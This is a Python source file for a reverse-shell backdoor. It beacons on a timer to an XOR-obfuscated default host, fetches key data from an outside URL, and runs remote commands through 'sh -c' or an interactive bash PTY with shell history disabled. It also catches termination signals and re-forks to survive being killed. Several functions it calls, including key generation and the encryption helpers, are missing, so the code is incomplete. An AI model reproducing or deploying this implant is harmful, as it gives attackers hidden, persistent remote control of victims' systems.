import os, sys, socket, time, signal, subprocess, selectors, pty, requests

server_modulus = 566985700738319622174686131400034453643720466970978517574628629274979976524124940713860540038882426013024114564601644133774454954579859603022526047211561634473245368041734849645333850659593387029777461624139999293346678168096585398894872902836488432305321788895930893995350254306011511954048973993218576068120842406854381660868440914954041085267631248545101914138883676131275460708745009456577214046268195248043933401098454229528930264593554947172986600022924103676180205323189749504546460222696144254434950563003806500524021358243739253925888283568187475109036444929999292467231057057868003949542201486910774286204467263359268168124928585201908563486221036238676222817747434022603388355897696091620276281574099795985472307965135468502881374317279001616973398539298555877212283138431306761372378738101671232030286096798836533645647014376468992868000495595560982785914820504104078715279785802300066599327401921364225207587243296778060887445799525002269634182195900334989318967452442166075135355126785800284396564017524632233821326493688824504309419677467169118434525079593731269479730143537689127087750148171355493757239210404790175123435648784211703985569364347710928586741341454862278795609365544396160373248258804813219121521794117
hostkeys_url = "https://war.cflems.net/hosts.json"
hdb = {}

args_used = 0
def get_param(env_name, prompt, default):
    global args_used

    if env_name in os.environ and len(os.environ[env_name]) > 0:
        return os.environ[env_name]
    elif len(sys.argv) > args_used+1 and len(sys.argv[args_used+1]) > 0:
        args_used += 1
        return sys.argv[args_used]
    else:
        try:
            inp = input(prompt).strip()
            if len(inp) < 1:
                return default
            return inp
        except:
            return default

def chm (eky):
    return ''.join([chr(ord(qjv)^0x4c) for qjv in eky])

def main():
    port, bits = 2236, 4096
    ha = get_param('HOST', 'host=', chm('?)\'b/* )!?b")8'))
    tts = int(get_param('TTS', 'tts=', 60*30))
    bits = int(get_param('BITS', 'bits=', 4096))

    if ':' in ha:
        ha, port = ha.split(':')
        port = int(port)

    print('working')
    p,q,n,e,d = keygen(bits=bits)
    privkey = { 'n': n, 'd': d }
    refresh_hdb()
    print('done')
    shield()
    polymorph()

    while True:
        if not work(ha, port, privkey, bits=bits):
            return
        polymorph()
        time.sleep(tts)

def shield():
    for sig in [signal.SIGHUP, signal.SIGINT, signal.SIGABRT, signal.SIGQUIT, signal.SIGTERM]:
        signal.signal(sig, sh)
    for fd in [sys.stdin, sys.stdout, sys.stderr]:
        os.close(fd.fileno())

def sh(a, b):
    polymorph()

def polymorph():
    if os.fork() != 0:
        sys.exit(0)

def handshake(sock, privkey, rpubkey, bits):
    nbytes, headsz = bits//8, 2
    sock.sendall(nbytes.to_bytes(headsz, 'big'))
    rnbytes = int.from_bytes(sock.recv(headsz), 'big')
    if rnbytes != nbytes:
        return False

    send_encrypted(sock, privkey['n'].to_bytes(nbytes, 'big'), rpubkey['e'], rpubkey['n'], bits=bits)
    return True

def refresh_hdb():
    global hostkeys_url, hdb
    try:
        resp = requests.get(hostkeys_url)
        resp.close()
        if resp.status_code != 200:
            return False
        hdb = resp.json()
        return True
    except:
        return False

def get_hostkey(host):
    global hdb, exp
    if 'keys' not in hdb:
        return False
    hkdb = hdb['keys']
    if host not in hkdb:
        return False
    hostent = hkdb[host]
    if 'n' not in hostent:
        del hkdb[host]
        return False
    try:
        return {'n': int(hostent['n']),
                'e': int(hostent['e']) if 'e' in hostent else exp}
    except:
        del hkdb[host]
        return False

def run_pty(sock, screen_is, screen_os):
    term = screen_is.recv()
    sel = selectors.DefaultSelector()
    pid, shfd = pty.fork()
    if pid == 0:
        os.environ['HISTFILE'] = ''
        if type(term) == bytes:
            term = str(term, 'utf-8')
        os.environ['TERM'] = term
        os.execle('/bin/bash', '/bin/bash', os.environ)

    try:
        sel.register(shfd, selectors.EVENT_READ, 0)
        sel.register(sock, selectors.EVENT_READ, 1)
        while True:
            events = sel.select()
            for event, mask in events:
                if event.data == 0:
                    try:
                        data = os.read(shfd, 1024)
                    except:
                        data = False
                    if not data:
                        return True
                    screen_os.send(data)
                else:
                    try:
                        data = screen_is.recv()
                    except:
                        data = False
                    if not data:
                        return False
                    elif data == b'\xc0\xdenpty':
                        return True
                    os.write(shfd, data)
    except:
        return
    finally:
        sel.close()
        try:
            os.close(shfd)
        except:
            pass

def work(h_addr, port, privkey, bits):
    global server_modulus, exp
    try:
        host = socket.gethostbyname(h_addr)
    except:
        host = h_addr
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))
        hostkey = get_hostkey(host)
        if hostkey:
            rpubkey = hostkey
        else:
            rpubkey = {'n': server_modulus, 'e': exp}
        if not handshake(sock, privkey, rpubkey, bits=bits):
            return True

        PS1 = '$ '
        if 'PS1' in os.environ:
            PS1 = os.environ['PS1']
        send_encrypted(sock, PS1, rpubkey['e'], rpubkey['n'], bits=bits)
        while True:
            cmd = recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits)
            if cmd == b'tunnel':
                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
                return True
            elif cmd == b'die':
                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
                return False
            elif cmd == b'refresh-hdb':
                if refresh_hdb():
                    response = '[pk] Host database refreshed.\n'
                else:
                    response = '[pk] Error: could not refresh host database.\n'
            elif cmd == b'pty':
                screen_is = InStreamCipher(sock, privkey, bits=bits)
                screen_os = OutStreamCipher(sock, rpubkey, bits=bits)
                if not run_pty(sock, screen_is, screen_os):
                    return True
                screen_os.send(b'\xc0\xdenpty')
                continue
            else:
                try:
                    proc = subprocess.Popen(['sh', '-c', cmd], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = proc.communicate()
                    response = stdout+stderr
                    if type(response) == bytes:
                        response = str(response, 'utf-8')
                except Exception as e:
                    response = '%s\n' % str(e)
            send_encrypted(sock, '%s%s' % (response, PS1), rpubkey['e'], rpubkey['n'], bits=bits)
    except:
        return True
    finally:
        sock.close()

if __name__ == '__main__':
    main()
